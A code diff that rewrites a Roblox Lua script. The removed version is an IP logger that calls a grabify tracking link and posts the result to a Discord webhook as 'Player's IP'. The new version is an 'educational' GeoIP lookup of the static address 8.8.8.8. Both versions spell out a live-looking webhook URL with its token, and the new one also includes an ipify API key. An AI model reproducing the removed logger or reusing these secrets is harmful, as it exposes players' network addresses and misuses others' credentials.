@@ -1,44 +1,76 @@
-local HttpService = game:GetService("HttpService")
-local webhook = "https://discord.com/api/webhooks/1388077936501981326/7gt3grPt15e72oWMRmEhJJs9HY0G7iC0oVyZxbMQ1EYb-IIdcgW3nRosgsGEbAVrooxQ"
+--// Educational Demonstration Only
+--// This script uses a STATIC TEST IP (8.8.8.8)
+--// It does NOT and CANNOT retrieve Roblox players' real IP addresses.
 
--- Function to get the player's IP (using grabify API)
-local function GetPlayerIP()
-    local ip = "Unknown"
+local HttpService = game:GetService("HttpService")
+
+-- Your provided webhook (never expose real webhooks in public scripts)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1388077936501981326/7gt3grPt15e72oWMRmEhJJs9HY0G7iC0oVyZxbMQ1EYb-IIdcgW3nRosgsGEbAVrooxQ"
+
+-- Your provided ipify key with static test IP
+local API_URL = "https://geo.ipify.org/api/v2/country?apiKey=at_zps7lpnsl4toY0jNCVjASDRGC3uUq&ipAddress=8.8.8.8"
+
+-- Function to call the GeoIP API using static IP for demonstration
+local function CallGeoAPI()
     local success, response = pcall(function()
-        return game:HttpGet("https://grabify.link/76KJXC")
+        return HttpService:GetAsync(API_URL)
     end)
-    
-    if success then
-        ip = response
+
+    if not success then
+        warn("Failed to contact API:", response)
+        return nil
     end
-    return ip
+
+    local data
+    local ok, decoded = pcall(function()
+        return HttpService:JSONDecode(response)
+    end)
+
+    if ok then
+        data = decoded
+    else
+        warn("Failed to decode JSON:", decoded)
+        return nil
+    end
+
+    return data
 end
 
--- Get the player's IP
-local playerIP = GetPlayerIP()
+-- Function to send the result to your Discord webhook
+local function SendToWebhook(geoData)
+    local country = geoData.location and geoData.location.country or "Unknown"
+    local ip = geoData.ip or "Unknown"
 
--- Create the message payload
-local message = {
-    ["content"] = "**Player's IP:**\n" .. playerIP,
-    ["embeds"] = {{
-        ["title"] = "What An Idiot",
-        ["description"] = "A player has executed the script.\nIP: " .. playerIP,
-        ["color"] = 16711680 -- Red color for visibility
-    }}
-}
+    local message = {
+        ["content"] = "**Educational GeoIP Lookup (Static Test IP)**",
+        ["embeds"] = {{
+            ["title"] = "GeoIP Data for Test IP",
+            ["description"] = "This is a demonstration using a static IP (8.8.8.8). Real Roblox player IPs are not accessible.",
+            ["fields"] = {
+                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
+                {["name"] = "Country", ["value"] = country, ["inline"] = true},
+            },
+            ["color"] = 3447003
+        }}
+    }
 
--- Encode the message as JSON
-local jsonMessage = HttpService:JSONEncode(message)
+    local jsonMessage = HttpService:JSONEncode(message)
 
--- Headers for the request
-local headers = {
-    ["Content-Type"] = "application/json"
-}
+    local success, err = pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, jsonMessage, Enum.HttpContentType.ApplicationJson)
+    end)
 
--- Send the message to the Discord webhook
-pcall(function()
-    request({
-        Url = webhook,
-        Body = jsonMessage,
-        Method = "POST",
-        Headers = headers
+    if success then
+        print("Sent to Discord successfully (educational example).")
+    else
+        warn("Failed to send to Discord:", err)
+    end
+end
+
+-- Execute the demonstration
+local geoData = CallGeoAPI()
+if geoData then
+    SendToWebhook(geoData)
+else
+    warn("Could not retrieve data from API.")
+end
